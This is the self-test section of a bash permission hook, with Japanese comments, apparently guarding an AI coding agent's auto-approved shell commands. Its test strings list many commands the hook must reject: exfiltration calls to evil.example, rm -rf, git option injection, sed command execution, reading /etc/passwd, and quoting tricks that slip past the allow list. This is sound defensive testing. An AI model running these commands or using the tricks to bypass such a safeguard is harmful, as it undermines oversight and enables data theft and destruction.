    'jq *'
    'head'
    'head *'
    'tail'
    'tail *'
    'grep'
    'grep *'
    'wc'
    'wc *'
    'ls'
    'ls *'
    'cat'
    'cat *'
    'env'
    # 多語サブコマンド (Bash(git status *) 等の派生)
    'git status'
    'git status *'
    'git log'
    'git log *'
    'gh pr view'
    'gh pr view *'
    # `:*` セマンティクス → "cmd" と "cmd *" の両方を派生させる
    'mkdir'
    'mkdir *'
    'bun test'
    'bun test *'
  )

  local fail=0
  assert_safe() {
    local label="$1" cmd="$2"
    if evaluate_command "$cmd"; then
      printf 'ok  : %s\n' "$label"
    else
      printf 'FAIL: %s  -- expected allow, got passthrough\n' "$label"
      fail=1
    fi
  }
  assert_unsafe() {
    local label="$1" cmd="$2"
    if evaluate_command "$cmd"; then
      printf 'FAIL: %s  -- expected passthrough, got allow\n' "$label"
      fail=1
    else
      printf 'ok  : %s\n' "$label"
    fi
  }

  # safe ケース
  assert_safe 'gh api 単発' 'gh api repos/foo/bar/pulls/1/comments'
  assert_safe 'echo 見出し + gh api' 'echo "=== inline ===" && gh api repos/foo/bar/pulls/1/comments'
  assert_safe '複数 gh api 連結' 'echo a && gh api repos/foo/bar/pulls/1/comments && echo b && gh api repos/foo/bar/issues/1/comments'
  assert_safe '|| 分岐' 'gh api repos/foo/bar/pulls/1 || echo failed'
  assert_safe '; 区切り' 'echo start; gh api repos/foo/bar/pulls/1; echo end'
  assert_safe 'クォート内に && を含む' 'echo "a && b" && gh api repos/foo/bar/pulls/1'
  assert_safe '--jq オプション付き' "gh api repos/foo/bar/pulls/1 --jq '.title'"
  assert_safe 'bare echo' 'echo && gh api repos/foo/bar/pulls/1'
  assert_safe 'バックスラッシュ偶数個 (\\\\)' 'echo "a\\\\" && gh api repos/foo/bar/pulls/1'
  assert_safe 'gh api | jq' "gh api repos/foo/bar/pulls/1/comments | jq '.[] | .id'"
  assert_safe 'gh api | jq -r' "gh api repos/foo/bar/pulls/1 | jq -r '.title'"
  assert_safe 'gh api | head' 'gh api repos/foo/bar/pulls/1 | head -5'
  # パイプ末尾に引数なしで置く道具 (` *` 由来の bare)。glob "head *" は空にマッチしないので、
  # setup.sh が bare を派生させないと ここが passthrough に落ちる
  assert_safe 'gh api | head (引数なし)' 'gh api repos/foo/bar/pulls/1 | head'
  assert_safe 'gh api | grep | head (引数なし)' "gh api repos/foo/bar/pulls/1 | grep -i x | head"
  assert_safe 'gh api && git status (引数なし多語)' 'gh api repos/foo/bar/pulls/1 && git status'
  assert_safe 'gh api | jq | head' "gh api repos/foo/bar/pulls/1 | jq '.[]' | head -5"
  assert_safe 'gh api | wc -l' 'gh api repos/foo/bar/pulls/1 | wc -l'
  assert_safe 'env (引数なし) を含む' 'env && gh api repos/foo/bar/pulls/1'
  assert_safe 'gh api && git status' 'gh api repos/foo/bar/pulls/1 && git status -s'
  assert_safe 'gh api && gh pr view' 'gh api repos/foo/bar/pulls/1 && gh pr view 42'
  assert_safe 'mkdir (引数なし :* 由来)' 'mkdir && gh api repos/foo/bar/pulls/1'
  assert_safe 'mkdir 引数あり (:* 由来)' 'mkdir -p /tmp/foo && gh api repos/foo/bar/pulls/1'
  assert_safe 'bun test (引数なし :* 由来)' 'bun test && gh api repos/foo/bar/pulls/1'
  assert_safe 'bun test 引数あり (:* 由来)' 'bun test --watch && gh api repos/foo/bar/pulls/1'
  # gh api の出力を /tmp へ保存するリダイレクトは実運用で多用するため許可
  assert_safe 'gh api > /tmp 保存' 'gh api repos/foo/bar/pulls/1 > /tmp/out.json'
  assert_safe 'gh api >> /tmp 追記' 'gh api repos/foo/bar/pulls/1 >> /tmp/out.json'
  assert_safe 'gh api --jq 付き > /tmp 保存' "gh api repos/foo/bar/pulls/1 --jq '.title' > /tmp/title.txt"
  assert_safe 'gh api > /tmp サブディレクトリ' 'gh api repos/foo/bar/pulls/1 > /tmp/sub/dir/out.json'

  # 2>&1 は fd 複製で副作用が無いため、単語として現れる限り読み飛ばす
  assert_safe '2>&1 単体' 'gh api repos/foo/bar/pulls/1 2>&1'
  assert_safe '2>&1 | head' 'gh api repos/foo/bar/pulls/1 2>&1 | head -c 2000'
  assert_safe '2>&1 が gh api 以外のセグメントに付く' 'echo start 2>&1 && gh api repos/foo/bar/pulls/1'
  # bare を派生させるのは safe リストに載っている語だけ。未収載の語は引数の有無に関わらず落とす
  assert_unsafe 'safe リストに無い bare コマンド' 'gh api repos/foo/bar/pulls/1 | xargs'
  assert_unsafe '2>&1 の後に & が続く' 'gh api repos/foo/bar/pulls/1 2>&1 & rm -rf /tmp/x'
  assert_unsafe '2>&1 とファイル書き込みの併用' 'gh api repos/foo/bar/pulls/1 2>&1 > /home/user/.zshrc'
  assert_unsafe '&> は全出力のファイル書き込み' 'gh api repos/foo/bar/pulls/1 &> /tmp/x'
  assert_unsafe '2>file は読み飛ばさない' 'gh api repos/foo/bar/pulls/1 2>/home/user/err.log'
  assert_unsafe '>&1 (2 が無い形) は読み飛ばさない' 'gh api repos/foo/bar/pulls/1 >&1'
  assert_unsafe '12>&1 は単語境界を満たさない' 'gh api repos/foo/bar/pulls/1 12>&1'

  # /dev/null への出力破棄も副作用が無いため読み飛ばす
  assert_safe '2>/dev/null | パイプ' "gh api repos/foo/bar/contents/f --jq '.content' 2>/dev/null | head -30"
  assert_safe '>/dev/null 2>&1 の併用' 'gh api repos/foo/bar/pulls/1 >/dev/null 2>&1'
  assert_safe '1>/dev/null' 'gh api repos/foo/bar/pulls/1 1>/dev/null'
  assert_safe '&>/dev/null' 'gh api repos/foo/bar/pulls/1 &>/dev/null'
  assert_safe 'gh api 以外のセグメントの 2>/dev/null' 'echo start 2>/dev/null && gh api repos/foo/bar/pulls/1'
  assert_unsafe '空白入り 2> /dev/null は対象外' 'gh api repos/foo/bar/pulls/1 2> /dev/null'
  assert_unsafe '/dev/null に見せた別パス' 'gh api repos/foo/bar/pulls/1 2>/dev/nullx'
  assert_unsafe '12>/dev/null は単語境界を満たさない' 'gh api repos/foo/bar/pulls/1 12>/dev/null'
  assert_unsafe '>/dev/null とファイル書き込みの併用' 'gh api repos/foo/bar/pulls/1 >/dev/null > /home/user/.zshrc'

  # sed: 「-n + 数値アドレス p」だけを受理する (それ以外は書き込み/実行を証明できない)
  assert_safe 'sed -n 行範囲' "gh api repos/foo/bar/contents/f --jq '.content' | sed -n '60,90p'"
  assert_safe 'sed -n 単一行' "gh api repos/foo/bar/pulls/1 | sed -n '5p'"
  assert_safe 'sed -n 最終行まで' "gh api repos/foo/bar/pulls/1 | sed -n '60,\$p'"
  assert_safe 'sed -n + ファイルオペランド' "gh api repos/foo/bar/pulls/1 | sed -n '1,20p' notes.txt"
  assert_safe 'sed -n と 2>/dev/null の併用' "gh api repos/foo/bar/pulls/1 2>/dev/null | sed -n '1,30p'"
  assert_safe 'sed --quiet (long form)' "gh api repos/foo/bar/pulls/1 | sed --quiet '1,5p'"
  assert_unsafe 'sed -i は in-place 編集' "gh api repos/foo/bar/pulls/1 | sed -i '' 's/x/y/' /home/user/.zshrc"
  assert_unsafe 'sed -I も in-place 編集' "gh api repos/foo/bar/pulls/1 | sed -I '' 's/x/y/' /home/user/.zshrc"
  assert_unsafe 'sed の w はファイル書き出し' "gh api repos/foo/bar/pulls/1 | sed -n '1,5w /tmp/x'"
  assert_unsafe 'sed の s///w もファイル書き出し' "gh api repos/foo/bar/pulls/1 | sed -n 's/x/y/w /tmp/x'"
  assert_unsafe 'sed の e はコマンド実行 (GNU)' "gh api repos/foo/bar/pulls/1 | sed -n '1,5p;9e cat /etc/passwd'"
  assert_unsafe 'sed -e は複数スクリプトを足せる' "gh api repos/foo/bar/pulls/1 | sed -n -e '1p' -e '2w /tmp/x'"
  assert_unsafe 'sed -f はスクリプト本体が外部' 'gh api repos/foo/bar/pulls/1 | sed -f /tmp/script.sed'
  assert_unsafe 'sed 正規表現アドレスは対象外' "gh api repos/foo/bar/pulls/1 | sed -n '/secret/p'"
  assert_unsafe 'sed -n なしは受理しない' "gh api repos/foo/bar/pulls/1 | sed '60,90p'"
  assert_unsafe 'sed の未知フラグ (-E)' "gh api repos/foo/bar/pulls/1 | sed -E -n '1,5p'"
  assert_unsafe 'sed の未知フラグ (-u)' "gh api repos/foo/bar/pulls/1 | sed -u -n '1,5p'"
  assert_unsafe 'sed 置換スクリプト' "gh api repos/foo/bar/pulls/1 | sed -n 's/x/y/p'"
  assert_unsafe 'パス付き sed は対象外' "gh api repos/foo/bar/pulls/1 | /usr/bin/sed -n '1,5p'"
  assert_unsafe 'sed 単体 (gh api を含まない)' "sed -n '1,5p' notes.txt"
  # クォート内改行はトークン化の出力を割るので、2 行目以降が入力ファイル名として
  # 受理されて w / e が素通りする。セグメントに改行があれば無条件で落とす。
  assert_unsafe 'sed スクリプト内改行 + w (ファイル書き出し)' "gh api repos/foo/bar/pulls/1 | sed -n '1,5p
w /tmp/pwned'"
  assert_unsafe 'sed スクリプト内改行 + e (コマンド実行)' "gh api repos/foo/bar/pulls/1 | sed -n '1p
1e rm -rf /tmp/x'"
  assert_unsafe 'sed スクリプト内改行 + s///w' "gh api repos/foo/bar/pulls/1 | sed -n '1p
s/a/b/w /tmp/pwned'"

  # git -C: サブコマンドより前が `-C <path>` だけのときに限り allow
  assert_safe 'git -C 絶対パス status' 'git -C /Users/u/projects/foo status'
  assert_safe 'git -C チルダ log' 'git -C ~/dotfiles log --oneline -5'
  assert_safe 'git -C 引数なし diff' 'git -C /Users/u/projects/foo diff'
  assert_safe 'git -C stash list' 'git -C /Users/u/projects/foo stash list'
  assert_safe 'git -C worktree list' 'git -C /Users/u/projects/foo worktree list'
  assert_safe 'git -C ls-files (クォート付きパターン)' "git -C ~/dotfiles ls-files '.claude/skills/*/SKILL.md'"
  assert_safe 'git -C | head の複合' 'git -C /Users/u/projects/foo branch -a --sort=-committerdate | head -40'
  assert_safe 'git -C && echo の複合' 'git -C /Users/u/projects/foo status && echo done'
  assert_safe 'git -C と gh api の混在' 'git -C /Users/u/projects/foo status && gh api repos/foo/bar/pulls/1'
  assert_safe 'git -C + 2>/dev/null' 'git -C /Users/u/projects/foo status 2>/dev/null'

  # 起動時警告が指していた本体: サブコマンド前へのオプション差し込み
  assert_unsafe 'git -C の後に -c 差し込み' "git -C /tmp -c core.fsmonitor='echo pwned' status"
  assert_unsafe 'git -C の前に -c 差し込み' "git -c core.fsmonitor='echo pwned' -C /tmp status"
  assert_unsafe 'git --exec-path 差し込み' 'git --exec-path=/tmp/fake -C /tmp status'
  assert_unsafe 'git -C のパス位置がオプション' "git -C -c core.pager='sh -c x' status"
  assert_unsafe 'git -C の連結形 (-C/path)' 'git -C/tmp status'
  assert_unsafe 'git -C が 2 組' 'git -C /tmp -C /etc status'

  # サブコマンドのホワイトリスト
  assert_unsafe 'git -C push' 'git -C /Users/u/projects/foo push'
  assert_unsafe 'git -C commit' 'git -C /Users/u/projects/foo commit -m x'
  assert_unsafe 'git -C stash (list なし) は退避' 'git -C /Users/u/projects/foo stash'
  assert_unsafe 'git -C サブコマンドなし' 'git -C /Users/u/projects/foo'
  assert_unsafe 'git -C config は書き込み経路' 'git -C /Users/u/projects/foo config diff.external x'

  # 素の git 以外・危険な連結
  assert_unsafe 'sudo git -C' 'sudo git -C /tmp status'
  assert_unsafe 'パス付き git -C' '/usr/bin/git -C /tmp status'
  assert_unsafe 'git -C と rm の連結' 'git -C /tmp status && rm -rf /tmp/x'
  assert_unsafe 'git -C とコマンド置換' 'git -C $(cat /tmp/p) status'
  assert_unsafe 'git -C の引数に改行' "git -C /tmp log --grep='a
b'"
  assert_unsafe 'git -C 出力を任意パスへリダイレクト' 'git -C /tmp status > /Users/u/.zshrc'

  # gh api graphql: mutation を含まない参照クエリは -f query=... 付きでも allow
  assert_safe 'graphql introspection' "gh api graphql -f query='query { __type(name: \"ProjectV2SingleSelectField\") { fields { name type { name kind ofType { name } } } } }'"
  assert_safe 'graphql 複数エイリアス' "gh api graphql -f query='query { a:__type(name: \"A\") { fields { name } } b:__type(name: \"B\") { inputFields { name } } }'"
  assert_safe 'graphql shorthand (query キーワード省略)' "gh api graphql -f query='{ viewer { login } }'"
  assert_safe 'graphql 変数付き' "gh api graphql -F owner=cli -F name=cli -f query='query(\$owner: String!, \$name: String!) { repository(owner: \$owner, name: \$name) { id } }'"
  assert_safe 'graphql --paginate --slurp' "gh api graphql --paginate --slurp -f query='query(\$endCursor: String) { viewer { repositories(first: 100, after: \$endCursor) { nodes { id } } } }'"
  assert_safe 'graphql | jq' "gh api graphql -f query='{ viewer { login } }' | jq -r '.data.viewer.login'"
  assert_safe 'graphql 複数行クエリ' "gh api graphql -f query='
    query {
      viewer { login }
    }
  '"
  assert_safe 'graphql > /tmp 保存' "gh api graphql -f query='{ viewer { login } }' > /tmp/out.json"
  assert_safe 'graphql --jq 付き' "gh api graphql -f query='{ viewer { login } }' --jq '.data'"
  assert_safe 'graphql 2>&1 | head' "gh api graphql -f query='{ viewer { login } }' 2>&1 | head -c 2000"

  assert_unsafe 'graphql mutation' "gh api graphql -f query='mutation { addStar(input: {starrableId: \"x\"}) { clientMutationId } }'"
  assert_unsafe 'graphql mutation (連結形 -fquery=)' "gh api graphql -fquery='mutation { addStar(input: {starrableId: \"x\"}) { clientMutationId } }'"
  assert_unsafe 'graphql mutation (--field= 形)' "gh api graphql --field=query='mutation { deleteIssue(input: {issueId: \"x\"}) { clientMutationId } }'"
  assert_unsafe 'graphql mutation (大文字混じり)' "gh api graphql -f query='Mutation { addStar(input: {starrableId: \"x\"}) { id } }'"
  # 複数行の 2 行目以降に mutation を隠す形（トークン分割任せだと素通りする穴）
  assert_unsafe 'graphql mutation (複数行の 2 行目)' "gh api graphql -f query='
    mutation { addStar(input: {starrableId: \"x\"}) { clientMutationId } }
  '"
  assert_unsafe 'graphql -f query=@file (中身を検査できない)' 'gh api graphql -f query=@q.graphql'
  assert_unsafe 'graphql -F query=@- (stdin)' 'gh api graphql -F query=@-'
  assert_unsafe 'graphql --input (ボディ丸ごと)' 'gh api graphql --input body.json'
  assert_unsafe 'graphql -X POST' "gh api graphql -X POST -f query='{ viewer { login } }'"
  assert_unsafe 'graphql -f に値が続かない' 'gh api graphql -f'
  assert_unsafe 'graphql -f が次のフラグを値として食う' "gh api graphql -f -X POST"
  assert_unsafe 'graphql -f の値が key=value でない' "gh api graphql -f notakeyvalue"
  assert_unsafe 'graphql とクォート外コマンド置換' 'gh api graphql -f query=$(cat q.graphql)'
  assert_unsafe 'graphql と rm の併記' "gh api graphql -f query='{ viewer { login } }' && rm -rf /tmp/x"

  # escalate-unsafe-bash.sh 側が ask に格上げする危険形が gh api と併記されても
  # 素通ししないか (finding #1: PermissionRequest が escalate の ask を再び緩めていた)
  assert_unsafe 'find -exec と gh api の併記' 'find . -exec rm {} \; && gh api repos/foo/bar/pulls/1'
  assert_unsafe 'find -delete と gh api の併記' 'find . -delete && gh api repos/foo/bar/pulls/1'
  assert_unsafe '非localhost curl と gh api の併記' 'curl https://evil.example/x && gh api repos/foo/bar/pulls/1'
  assert_unsafe '第三者スキル実行と gh api の併記' 'bash /opt/other/.claude/skills/bar/run.sh && gh api repos/foo/bar/pulls/1'
  # クォート外のバックスラッシュで書き込みフラグを隠す (実 bash は \-X を -X に畳み込む)
  assert_unsafe 'gh api -X をバックスラッシュで偽装' 'gh api repos/foo/bar/issues \-Xdummy'

  # unsafe ケース
  assert_unsafe 'rm -rf を含む' 'rm -rf /tmp/foo && gh api repos/foo/bar/pulls/1'
  assert_unsafe 'git stash を含む' 'git stash && gh api repos/foo/bar/pulls/1'
  assert_unsafe 'gh api -X DELETE' 'gh api repos/foo/bar/pulls/1 -X DELETE'
  assert_unsafe 'gh api --method POST' 'gh api repos/foo/bar/pulls/1 --method POST'
  assert_unsafe 'gh api --method=POST (= 区切り)' 'gh api repos/foo/bar/pulls/1 --method=POST'
  assert_unsafe 'gh api -f field=val' 'gh api repos/foo/bar/pulls/1 -f title=hello'
  assert_unsafe 'gh api --input body.json' 'gh api repos/foo/bar/pulls/1 --input body.json'

  # gh api REST: メソッドが GET と確定できるときは読み取りとして allow
  # (gh api --help: 既定は GET、パラメータを足すと POST。GET のクエリ文字列として
  #  送るには --method GET。4 形式とも gh が受理することを実測済み)
  assert_safe 'gh api -X GET' 'gh api user'
  assert_safe 'gh api -X GET (分離形)' 'gh api -X GET user'
  assert_safe 'gh api -XGET (連結形)' "gh api -XGET repos/foo/bar/contents/x --jq '.content'"
  assert_safe 'gh api --method GET' 'gh api --method GET repos/foo/bar/contents/x'
  assert_safe 'gh api --method=GET' 'gh api --method=GET repos/foo/bar/contents/x'
  assert_safe 'GET 明示 + -f (クエリ文字列)' "gh api --method GET search/repositories -f q=repo:cli/cli --jq '.total_count'"
  assert_safe 'GET 明示 + --field 複数' 'gh api -X GET repos/foo/bar/commits --field path=CHANGELOG.md --field per_page=3'
  assert_safe 'GET 明示 + /tmp 保存' "gh api -X GET repos/foo/bar/contents/x --jq '.content' > /tmp/x.json"

  # メソッドが GET と確定できない形は従来どおり unsafe
  assert_unsafe 'GET と DELETE の併記 (後勝ちを当てにしない)' 'gh api -X GET -X DELETE repos/foo/bar/issues/1'
  assert_unsafe 'GET の小文字 (実装差を当てにしない)' 'gh api -X get user'
  # 実 gh (pflag) は `-X=GET` を GET として受理する (実測)。hook 側は `=GET` を
  # 値として読むので unsafe に倒れる。安全側の取りこぼしなのでこのまま固定する。
  assert_unsafe '-X=GET (hook は = 区切りの短縮形を解釈しない)' 'gh api -X=GET user'
  assert_unsafe '-X に値が続かない' 'gh api -X'
  assert_unsafe 'GET 明示 + -F key=@file' 'gh api -X GET repos/foo/bar/x -F body=@/tmp/x'
  assert_unsafe 'GET 明示 + -F key=@- (stdin)' 'gh api -X GET repos/foo/bar/x -F body=@-'
  # pflag の短縮形は `-F=key=value` も受理する (実測)。先頭 `=` を剥がさないと
  # 値が `=body=@x` になり、@ 判定をすり抜けてファイル本文が外部へ出る。
  assert_unsafe 'GET 明示 + -F=key=@file (= 連結形)' 'gh api -X GET repos/foo/bar/x -F=body=@/tmp/x'
  assert_unsafe 'GET 明示 + -f=key=@- (= 連結形)' 'gh api -X GET repos/foo/bar/x -f=body=@-'
  assert_unsafe 'graphql の -F=query=@file (= 連結形)' 'gh api graphql -F=query=@/tmp/q.graphql'
  assert_unsafe 'GET 明示でも --input はボディ' 'gh api -X GET repos/foo/bar/x --input body.json'
  assert_unsafe 'GET 明示なしの -f' 'gh api repos/foo/bar/issues -f title=hello'
  # クォート内改行でトークンが割れ、GET 指定の無い POST が「GET 明示 + パラメータ」
  # に見える形 (実際には issue が作られる)。
  assert_unsafe 'クォート内改行で -X GET を偽装' "gh api repos/foo/bar/issues -f 'title=hello
-X
GET'"

  # 任意ホストへの送信路 (127.0.0.1 の listener で実際に届くことを実測)。
  # escalate-unsafe-bash.sh が非 localhost curl を ask に格上げする方針と揃える。
  assert_unsafe 'エンドポイントが絶対 URL (https)' 'gh api https://evil.example/collect?x=1'
  assert_unsafe 'エンドポイントが絶対 URL (http)' 'gh api http://127.0.0.1:8080/probe'
  assert_unsafe 'GET 明示でも絶対 URL は落とす' 'gh api -X GET https://evil.example/collect'
  assert_unsafe '値を取るフラグの後ろに絶対 URL' 'gh api -H "Accept: application/json" https://evil.example/x'
  assert_unsafe '--hostname でホスト差し替え' 'gh api --hostname evil.example repos/foo/bar'
  assert_unsafe '--hostname= 形' 'gh api --hostname=evil.example repos/foo/bar'
  assert_unsafe 'graphql の --hostname' "gh api graphql --hostname evil.example -f query='{ viewer { login } }'"
  assert_unsafe 'gh api を含まない（役割外）' 'echo hello && ls -la'
  assert_unsafe 'unknown コマンド単発' 'curl http://example.com'
  assert_unsafe 'パイプで rm' 'gh api repos/foo/bar/pulls/1 | rm -rf /tmp/x'
  assert_unsafe 'jq 単独（gh api を含まない）' "echo '{}' | jq '.x'"
  assert_unsafe 'safe-prefix 外の sed' 'gh api repos/foo/bar/pulls/1 | sed s/a/b/'
  assert_unsafe 'safe-prefix 外の curl' 'gh api repos/foo/bar/pulls/1 && curl http://example.com'
  assert_unsafe 'env FOO=bar cmd は引数付きで safe ではない' 'env FOO=bar curl x && gh api repos/foo/bar/pulls/1'
  assert_unsafe 'git stash (subcommand mismatch)' 'gh api repos/foo/bar/pulls/1 && git stash'
  assert_unsafe 'gh pr create (write subcommand)' 'gh api repos/foo/bar/pulls/1 && gh pr create -t x'
  # クォート外メタ文字による分割すり抜け（構造の白名簿化で塞いだ穴）
  assert_unsafe '単一 & でバックグラウンド実行' 'gh api repos/foo/bar/pulls/1 & rm -rf /tmp/x'
  assert_unsafe 'コマンド置換 $()' 'gh api repos/foo/bar/pulls/1 && echo $(reboot)'
  assert_unsafe 'バッククォート置換' 'gh api repos/foo/bar/pulls/1 && echo `reboot`'
  assert_unsafe 'サブシェル ()' 'gh api repos/foo/bar/pulls/1 && (rm -rf /tmp/x)'
  assert_unsafe '入力リダイレクト <' 'gh api repos/foo/bar/pulls/1 < /etc/passwd'
  assert_unsafe 'echo でリダイレクト上書き' 'echo pwned > /home/user/.zshrc && gh api repos/foo/bar/pulls/1'
  assert_unsafe 'gh api の任意先リダイレクト' 'gh api repos/foo/bar/pulls/1 > /home/user/.zshrc'
  assert_unsafe 'gh api リダイレクト先が /tmp 外' 'gh api repos/foo/bar/pulls/1 > /etc/hosts'
  assert_unsafe 'gh api リダイレクト先に .. traversal' 'gh api repos/foo/bar/pulls/1 > /tmp/../etc/x'
  # finding #0: リダイレクト先のコマンド置換がノーチェックで ALLOW されていた穴
  assert_unsafe 'gh api リダイレクト先に $() コマンド置換' 'gh api repos/foo/bar/pulls/1 > /tmp/$(id).json'
  assert_unsafe 'gh api リダイレクト先にバッククォート置換' 'gh api repos/foo/bar/pulls/1 > /tmp/`id`.json'
  assert_unsafe 'ダブルクォート内 $ 展開' 'gh api repos/foo/bar/pulls/1 && echo "$HOME"'
  # gh api 書き込みフラグの long form / 連結形（トークン判定で塞いだ穴）
  assert_unsafe 'gh api --field (long form write)' 'gh api repos/foo/bar/issues --field title=spam'
  assert_unsafe 'gh api --raw-field (long form write)' 'gh api repos/foo/bar/issues --raw-field body=x'
  assert_unsafe 'gh api -XDELETE (連結形)' 'gh api repos/foo/bar/pulls/1 -XDELETE'
  assert_unsafe 'gh api -Ftitle=x (連結形)' 'gh api repos/foo/bar/issues -Ftitle=hello'
  assert_unsafe 'gh api -ftitle=x (連結形)' 'gh api repos/foo/bar/issues -ftitle=hello'

  # split_segments 単体: クォート尊重と空セグメント抑制
  assert_split_count() {
    local label="$1" cmd="$2" expected="$3"
    local got
    # NUL 区切り出力なので NUL の個数を数える
    got="$(split_segments "$cmd" | tr -cd '\0' | wc -c | tr -d ' ')"
    if [ "$got" = "$expected" ]; then
      printf 'ok  : %s\n' "$label"
    else
      printf 'FAIL: %s  -- expected %s segments, got %s\n' "$label" "$expected" "$got"
      fail=1
    fi
  }
  assert_split_count 'split: quoted &&' 'echo "a && b" && gh api foo' 2
  assert_split_count 'split: 連続 ; は空セグメント抑制' 'echo a;; gh api foo' 2
  assert_split_count 'split: trailing ; は空セグメント抑制' 'gh api foo;' 1

  # 改行はコマンド区切り (bash と同じ)。1 セグメントに潰さず個別に白名簿を通す。
  assert_split_count 'split: 改行区切り' $'echo a\ngh api foo' 2
  assert_split_count 'split: 連続改行は空セグメント抑制' $'echo a\n\ngh api foo' 2
  assert_split_count 'split: && の直後の改行 (継続行)' $'echo a &&\ngh api foo' 2
  assert_split_count 'split: クォート内改行は分割しない' $'gh api foo --jq \'.a\n.b\'' 1
  assert_split_count 'split: 行継続 \<改行> は分割しない' $'gh api foo \\\n--jq .x' 1
  assert_safe   '改行区切りの複合コマンド' $'gh api repos/foo/bar/pulls/1\necho done'
  assert_safe   '改行とパイプの混在' $'gh api repos/foo/bar/pulls/1 | jq -r .title\necho done'
  assert_safe   '改行 3 行 (gh api + echo + grep)' $'gh api repos/foo/bar/pulls/1\necho "=== hits ==="\ngrep -rn foo src/'
  assert_unsafe '改行で rm が混ざる' $'gh api repos/foo/bar/pulls/1\nrm -rf /tmp/x'
  assert_unsafe '改行で未収載コマンドが混ざる' $'gh api repos/foo/bar/pulls/1\npython3 -c "print(1)"'
  assert_unsafe '行継続で書き込みフラグが続く' $'gh api repos/foo/bar/pulls/1 \\\n--method DELETE'

  # クォート外の `\` はリテラル化なので、`\"` / `\'` で擬似クォート区間を開いて
  # メタ文字を隠せてはならない (bash は `echo \"a` を background 実行して後続を走らせる)。
  assert_unsafe 'エスケープ済み " が & を隠す'      'gh api repos/foo/bar/pulls/1 && echo \"a&rm -rf /tmp/x'
  assert_unsafe 'エスケープ済み " が & を隠す(閉じ)' 'gh api repos/foo/bar/pulls/1 && echo \"a&rm -rf /tmp/x\"'
  assert_unsafe "エスケープ済み ' が & を隠す"      "gh api repos/foo/bar/pulls/1 && echo \\'a&rm -rf /tmp/x"
  assert_unsafe 'エスケープ済み " が > を隠す'      'gh api repos/foo/bar/pulls/1 && echo \"a>/tmp/pwned'
  assert_unsafe 'エスケープ済み " が $( を隠す'     'gh api repos/foo/bar/pulls/1 && echo \"a$(id)'
  # 逆に、リテラル化された 1 文字そのものは制御演算子ではないので allow のままでよい。
  assert_safe   'エスケープされた空白はセグメントを割らない' 'git -C /re\ po status'
  assert_safe   'エスケープされた ; は区切りではない'        $'gh api repos/foo/bar/pulls/1\necho a\\;b'

  if [ "$fail" = 0 ]; then
    printf '\nall tests passed.\n'
    return 0
  else
    printf '\nsome tests failed.\n'
    return 1
  fi
}

if [ "${1:-}" = '--self-test' ]; then
  run_self_test
  exit $?
fi

main
